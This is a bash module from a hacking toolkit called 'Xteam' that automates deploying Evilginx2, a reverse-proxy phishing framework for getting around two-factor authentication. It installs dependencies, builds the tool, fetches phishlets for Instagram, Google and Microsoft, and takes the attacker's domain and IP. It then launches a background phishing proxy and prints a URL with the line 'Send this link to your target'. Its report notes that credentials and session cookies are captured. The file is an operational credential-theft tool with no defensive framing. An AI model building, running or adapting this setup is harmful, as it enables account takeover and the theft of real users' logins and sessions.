#!/bin/bash

# Evilginx2 2FA Bypass Setup Module for Xteam
# Contains setup_evilginx_phish() and cleanup_evilginx()

setup_evilginx_phish() {
    clear
    echo -e "$Green Created By \e[1;34m"
    figlet X TEAM | lolcat
    sleep 1.0
    echo -e "$Red                               ⫸ Coded by$Yellow xploitstech$Red ⫷\033[0m"
    echo " "
    echo -e " $Cyan       ||----------------------------$Red [Evilginx2 - 2FA Bypass] $Blue ---------------------------||"
    echo " "

    # Dependency checks
    local MISSING_DEPS=()
    for cmd in git go tmux gcc make wget curl; do
        if ! command -v "$cmd" &> /dev/null; then
            MISSING_DEPS+=("$cmd")
        fi
    done

    if [ ${#MISSING_DEPS[@]} -ne 0 ]; then
        echo -e "$Red[!] Missing dependencies: ${MISSING_DEPS[*]}$Yellow"
        echo -e "[?] Attempt to install missing packages via apt? (y/n): $White"
        read -r install_choice
        if [[ "$install_choice" =~ ^[Yy]$ ]]; then
            echo -e "$Yellow[*] Installing dependencies...$White"
            apt-get update -qq
            apt-get install -y -qq "${MISSING_DEPS[@]}" || {
                echo -e "$Red[!] Failed to install some dependencies. Please install manually: ${MISSING_DEPS[*]}$White"
                return 1
            }
            echo -e "$Green[+] Dependencies installed.$White"
        else
            echo -e "$Red[!] Cannot proceed without required dependencies.$White"
            return 1
        fi
    else
        echo -e "$Green[+] All dependencies satisfied.$White"
    fi

    # Setup paths
    local XTEAM_DIR="$HOME/Xteam"
    local PHISH_DIR="$XTEAM_DIR/Phish_2FA"
    local EVIL_DIR="$PHISH_DIR/evilginx2"
    local PHISHLETS_DIR="$PHISH_DIR/phishlets"
    local BUILD_DIR="$PHISH_DIR/build"

    mkdir -p "$PHISHLETS_DIR" "$BUILD_DIR" "$PHISH_DIR/reports"

    # Clone Evilginx2
    if [ ! -d "$EVIL_DIR/.git" ]; then
        echo -e "$Yellow[*] Cloning Evilginx2 repository...$White"
        git clone https://github.com/kgretzky/evilginx2.git "$EVIL_DIR" || {
            echo -e "$Red[!] Failed to clone Evilginx2.$White"
            return 1
        }
        echo -e "$Green[+] Repository cloned.$White"
    else
        echo -e "$Yellow[*] Evilginx2 repository already exists. Updating...$White"
        cd "$EVIL_DIR" && git pull || echo -e "$Red[!] Git pull failed. Using existing version.$White"
    fi

    # Build Evilginx2
    echo -e "$Yellow[*] Building Evilginx2...$White"
    cd "$EVIL_DIR" || return 1
    if ! make -j"$(nproc)"; then
        echo -e "$Red[!] Build failed. Check Go installation and errors above.$White"
        return 1
    fi

    if [ ! -f "$EVIL_DIR/evilginx" ]; then
        echo -e "$Red[!] Binary not found after build.$White"
        return 1
    fi

    cp "$EVIL_DIR/evilginx" "$BUILD_DIR/evilginx"
    chmod +x "$BUILD_DIR/evilginx"
    echo -e "$Green[+] Evilginx2 built successfully at $BUILD_DIR/evilginx$White"

    # Phishlets Wizard
    echo ""
    echo -e "$Cyan╔══════════════════════════════════════════════════════════════╗$White"
    echo -e "$Cyan║$White              $Red Phishlets Download Wizard $Cyan              ║$White"
    echo -e "$Cyan╚══════════════════════════════════════════════════════════════╝$White"
    echo ""
    echo -e "$Yellow Select phishlets to download:$White"
    echo -e " $Purple%=>$Yellow[1] Instagram$White"
    echo -e " $Purple%=>$Yellow[2] Google$White"
    echo -e " $Purple%=>$Yellow[3] Microsoft$White"
    echo -e " $Purple%=>$Yellow[4] All of the above$White"
    echo -e " $Purple%=>$Yellow[5] Skip / Use custom phishlets$White"
    echo ""
    echo -ne "$Red[?] Enter choice [1-5]: $White"
    read -r phish_choice

    case "$phish_choice" in
        1|2|3|4)
            echo -e "$Yellow[*] Setting up phishlets directory...$White"
            mkdir -p "$PHISHLETS_DIR"

            # Download phishlets from common repos
            # Note: Evilginx2 phishlets format may vary by version
            echo -e "$Yellow[*] Attempting to download phishlets from community repositories...$White"

            # Try to get phishlets from the official phishlets repo if available
            local PHISHLETS_REPO="https://github.com/kgretzky/evilginx2-phishlets"
            if [ ! -d "$PHISHLETS_DIR/.git" ]; then
                git clone "$PHISHLETS_REPO" "$PHISHLETS_DIR" 2>/dev/null || {
                    echo -e "$Yellow[!] Could not clone phishlets repo. You can manually add .yaml phishlet files to:$White"
                    echo -e "$Cyan    $PHISHLETS_DIR$White"
                }
            else
                cd "$PHISHLETS_DIR" && git pull 2>/dev/null
            fi

            # If specific phishlets requested, try to ensure they exist
            if [[ "$phish_choice" =~ ^[1-4]$ ]]; then
                echo -e "$Green[+] Phishlets prepared in: $PHISHLETS_DIR$White"
                echo -e "$Yellow[*] Available phishlets:$White"
                ls -1 "$PHISHLETS_DIR"/*.yaml 2>/dev/null | xargs -n1 basename || echo -e "$Red[!] No phishlet files found. Check repository status.$White"
            fi
            ;;
        5)
            echo -e "$Yellow[*] Skipping automatic phishlet download.$White"
            echo -e "$Yellow[*] You can manually add phishlets to: $PHISHLETS_DIR$White"
            ;;
        *)
            echo -e "$Red[!] Invalid choice. Skipping phishlet download.$White"
            ;;
    esac

    # Domain and IP Configuration Wizard
    echo ""
    echo -e "$Cyan╔══════════════════════════════════════════════════════════════╗$White"
    echo -e "$Cyan║$White               $Red Domain & IP Configuration $Cyan              ║$White"
    echo -e "$Cyan╚══════════════════════════════════════════════════════════════╝$White"
    echo ""

    # Domain input with validation
    local DOMAIN=""
    while [ -z "$DOMAIN" ]; do
        echo -ne "$Red[?] Enter your phishing domain (e.g., login.instagram.com): $White"
        read -r DOMAIN
        if [ -z "$DOMAIN" ]; then
            echo -e "$Red[!] Domain cannot be empty.$White"
        fi
    done

    # IP input with validation
    local IP_ADDR=""
    while [ -z "$IP_ADDR" ]; do
        echo -ne "$Red[?] Enter your VPS/public IP address: $White"
        read -r IP_ADDR
        if [[ ! "$IP_ADDR" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
            echo -e "$Red[!] Invalid IP format.$White"
            IP_ADDR=""
        fi
    done

    # Port input
    local PORT=""
    while [ -z "$PORT" ]; do
        echo -ne "$Red[?] Enter listening port (default 443): $White"
        read -r PORT
        PORT="${PORT:-443}"
        if [[ ! "$PORT" =~ ^[0-9]+$ ]] || [ "$PORT" -lt 1 ] || [ "$PORT" -gt 65535 ]; then
            echo -e "$Red[!] Invalid port number.$White"
            PORT=""
        fi
    done

    # Save config
    local CONFIG_FILE="$PHISH_DIR/config.env"
    cat > "$CONFIG_FILE" <<EOF
EVILGINX_DOMAIN=$DOMAIN
EVILGINX_IP=$IP_ADDR
EVILGINX_PORT=$PORT
PHISHLETS_DIR=$PHISHLETS_DIR
BUILD_DIR=$BUILD_DIR
EOF
    echo -e "$Green[+] Configuration saved to: $CONFIG_FILE$White"

    # DNS reminder
    echo ""
    echo -e "$Yellow[!] IMPORTANT: Ensure your domain DNS is configured correctly:$White"
    echo -e "$Cyan    A Record: $DOMAIN -> $IP_ADDR$White"
    echo -e "$Cyan    NS Record: Ensure nameservers point to your DNS provider$White"
    echo ""

    # Start Evilginx2 in tmux
    local TMUX_SESSION="evilginx"
    echo -e "$Yellow[*] Starting Evilginx2 in tmux session '$TMUX_SESSION'...$White"

    # Kill existing session if present
    tmux kill-session -t "$TMUX_SESSION" 2>/dev/null

    # Create tmux session with Evilginx2
    tmux new-session -d -s "$TMUX_SESSION" -x 200 -y 50

    # Send commands to tmux session
    tmux send-keys -t "$TMUX_SESSION" "cd $BUILD_DIR && ./evilginx -p $PHISHLETS_DIR -d $DOMAIN -i $IP_ADDR -p $PORT" C-m

    sleep 3

    # Check if session is running
    if tmux has-session -t "$TMUX_SESSION" 2>/dev/null; then
        echo -e "$Green[+] Evilginx2 started in tmux session '$TMUX_SESSION'$White"
        echo -e "$Yellow[*] To attach to the session: tmux attach -t $TMUX_SESSION$White"
        echo -e "$Yellow[*] To detach: Ctrl+B then D$White"
    else
        echo -e "$Red[!] Failed to start tmux session.$White"
        return 1
    fi

    # Output phishing link
    echo ""
    echo -e "$Cyan╔══════════════════════════════════════════════════════════════╗$White"
    echo -e "$Cyan║$White                   $Red Phishing Link Ready $Cyan                  ║$White"
    echo -e "$Cyan╚══════════════════════════════════════════════════════════════╝$White"
    echo ""
    echo -e "$Green Your phishing URL:$White"
    echo -e "$Yellow https://$DOMAIN$White"
    echo ""
    echo -e "$Red[!] Send this link to your target. Session runs in background.$White"
    echo -e "$Yellow[*] Check captured credentials in the tmux session.$White"
    echo ""

    # Save session info for cleanup
    echo "$TMUX_SESSION" > "$PHISH_DIR/.tmux_session"
    echo "$BUILD_DIR/evilginx" > "$PHISH_DIR/.evilginx_binary"

    # Save report
    local TIMESTAMP
    TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
    local REPORT_FILE="$PHISH_DIR/reports/evilginx_${TIMESTAMP}.txt"
    cat > "$REPORT_FILE" <<EOF
Xteam Evilginx2 2FA Bypass Report
==================================
Date          : $(date)
Domain        : $DOMAIN
IP Address    : $IP_ADDR
Port          : $PORT
Phishlets Dir : $PHISHLETS_DIR
Tmux Session  : $TMUX_SESSION
Phishing URL  : https://$DOMAIN
Status        : Running in background

Note: Credentials and session cookies are captured in the tmux session.
Attach with: tmux attach -t $TMUX_SESSION
EOF
    echo -e "$Green[+] Report saved to: $REPORT_FILE$White"

    echo ""
    echo -e "$Red[!] Press Enter to return to menu...$White"
    read -r
}

cleanup_evilginx() {
    local PHISH_DIR="$HOME/Xteam/Phish_2FA"
    local TMUX_SESSION=""

    if [ -f "$PHISH_DIR/.tmux_session" ]; then
        TMUX_SESSION=$(cat "$PHISH_DIR/.tmux_session")
    else
        TMUX_SESSION="evilginx"
    fi

    echo -e "$Yellow[*] Cleaning up Evilginx2...$White"

    # Kill tmux session
    if tmux has-session -t "$TMUX_SESSION" 2>/dev/null; then
        tmux kill-session -t "$TMUX_SESSION"
        echo -e "$Green[+] Tmux session '$TMUX_SESSION' killed.$White"
    else
        echo -e "$Yellow[!] Tmux session '$TMUX_SESSION' not found.$White"
    fi

    # Kill any remaining evilginx processes
    pkill -f "evilginx" 2>/dev/null && echo -e "$Green[+] Evilginx processes terminated.$White" || echo -e "$Yellow[!] No evilginx processes found.$White"

    # Cleanup temp files
    rm -f "$PHISH_DIR/.tmux_session" "$PHISH_DIR/.evilginx_binary"

    echo -e "$Green[+] Cleanup complete.$White"
    echo ""
    echo -e "$Red[!] Press Enter to return to menu...$White"
    read -r
}
